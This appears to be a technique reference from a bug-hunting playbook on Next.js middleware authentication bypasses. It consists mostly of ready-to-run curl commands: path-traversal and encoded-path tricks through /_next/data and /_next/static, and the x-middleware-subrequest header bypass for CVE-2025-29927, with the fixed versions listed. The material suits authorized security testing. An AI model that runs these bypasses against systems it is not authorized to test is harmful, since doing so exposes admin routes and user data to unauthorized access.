# HUNT-NEXTJS — Next.js / SSR Framework Vulnerabilities — Technique reference

Moved out of `SKILL.md` to keep the main playbook lean. Load this file when you need concrete technique.

---

## Phase 3 — Middleware Auth Bypass



```bash

# Next.js middleware runs on edge runtime and may skip certain paths

# Test protected route directly

curl -s -o /dev/null -w "%{http_code}" https://$TARGET/admin/dashboard

# → 200 means accessible



# Test via /_next/data/ (SSG/ISR JSON) — middleware may not apply

curl -s "https://$TARGET/_next/data/$BUILD_ID/admin/dashboard.json"



# Test via static asset path prefix (middleware matcher may exclude /_next/static)

curl -s "https://$TARGET/_next/static/../admin/dashboard"



# Encoded path bypass

curl -s "https://$TARGET/%5Fnext/data/$BUILD_ID/admin/users.json"

curl -s "https://$TARGET/_next/data/$BUILD_ID/..%2Fadmin%2Fusers.json"

```



---



### Middleware bypass via `x-middleware-subrequest` (CVE-2025-29927)

Next skips middleware execution entirely when this header asserts an internal subrequest — bypassing auth/redirect middleware on gated routes.

```bash

curl -s -o /dev/null -w "%{http_code}" https://$TARGET/admin/dashboard \

  -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware"

# also: -H "x-middleware-subrequest: src/middleware"  and  "pages/_middleware"

# 200 on a middleware-gated route = bypassed. Fixed 12.3.5 / 13.5.9 / 14.2.25 / 15.2.3.

```
